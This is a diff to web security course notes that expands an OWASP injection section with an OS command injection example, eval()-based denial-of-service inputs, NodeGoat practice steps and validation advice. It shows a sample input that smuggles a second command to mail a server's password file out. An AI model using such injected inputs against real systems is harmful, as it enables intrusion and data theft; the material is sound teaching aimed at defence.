@@ -14,6 +14,8 @@
 - [NodeGoat](#nodegoat)
 - [OWASP Top 10 in practice](#owasp-top-10-in-practice)
     - [Injection](#injection)
+        - [NodeGoat](#nodegoat)
+        - [How to avoid it](#how-to-avoid-it)
     - [Broken authentication](#broken-authentication)
     - [XSS](#xss)
     - [Direct object references](#direct-object-references)
@@ -158,12 +160,48 @@ In the following sections, we will discuss the OWASP Top 10 vulnerabilities (der
 
 ### Injection
 
-Exploiting unchecked input
-Parameter manipulation of HTML forms
-URL manipulation  (remember: URLs often contain parameters)
-Hidden HTML field manipulation
-HTTP header manipulation
-Cookie manipulation
+Injection attacks exploit the fact that input is interpreted by the server without any checks. A malicious user can create input that lead to unintended command executions on the server-side.
+
+Input for injection attacks can be created via:
+
+- Parameter manipulation of HTML forms (e.g. input fields are filled with JavaScript code);
+- URL manipulation (remember: URLs often contain parameters);
+- HTTP header manipulation;
+- Hidden HTML field manipulation;
+- Cookie manipulation.
+
+Command executions on the server can take multiple forms, we first consider **OS command injection**:
+
+![OS command injection](img/L8-os-command-injection.png)
+
+:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (*Thank yo for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
+
+- The benign input `john@test.nl` leads to the following OS command: `cat confirm|mail john@test.nl`. This command line is indeed sufficient to send an email, as Linux has a command line [mail](https://linux.die.net/man/1/mail) tool.
+- An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two mails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly *unintended code execution.*.
+
+Web applications that do not validate their input are also attackable, if they interpret the user's input as JavaScript code snippet. Imagine a calculator web application that allows a client to provide a formula, that is then send to the server, executed with the result being sent back to the client. JavaScript offers an [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function that takes a string representing JavaScript code and runs it, e.g. the string `100*4+2` can be evaluated with `eval('100*4+2')`, resulting in `402`. However, a malicious user can also input `while(1)` or [`process.exit()`](https://nodejs.org/api/process.html#process_process_exit_code); the former leads the event loop to be stuck forever in the while loop, while the latter instructs Node.js to terminate the running process. Both of these malicious inputs constitute a denial of service attack.
+
+`eval()` in fact is so dangerous that [it should never be used](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#Do_not_ever_use_eval!).
+
+#### NodeGoat
+
+1. To try out this attack, head to NodeGoat's installation at http://nodegoat.herokuapp.com/login. 
+2. Login with `user1` (user) and `User1_123` (password).
+3. On the left-hand side, click on *Contributions*.
+4. To explore the effect of different inputs, try out a few numbers and strings in the three *New Payroll Contribution Percent* form fields.
+5. In one of the form fields, now fill in `process.exit()` and click `Submit`.
+6. You should now see an application error.
+
+#### How to avoid it
+
+Injection attacks can be avoided by **validating** user input (e.g. is this input really an email address?) and **sanitizing** it (e.g. by stripping out potential JavaScript code elements). These steps should occur **on the server-side**, as a malicious user can always circumvent client-side validation/sanitation steps.
+
+A popular Node package that validates and sanitizes user input is [validator](https://www.npmjs.com/package/validator). For example, to check whether a user input constitutes a valid email address, the following two lines of code are sufficient:
+
+```javascript
+var validator = require('validator');
+var isEmail = validator.isEmail('while(1)'); //false
+```
 
 ### Broken authentication
 
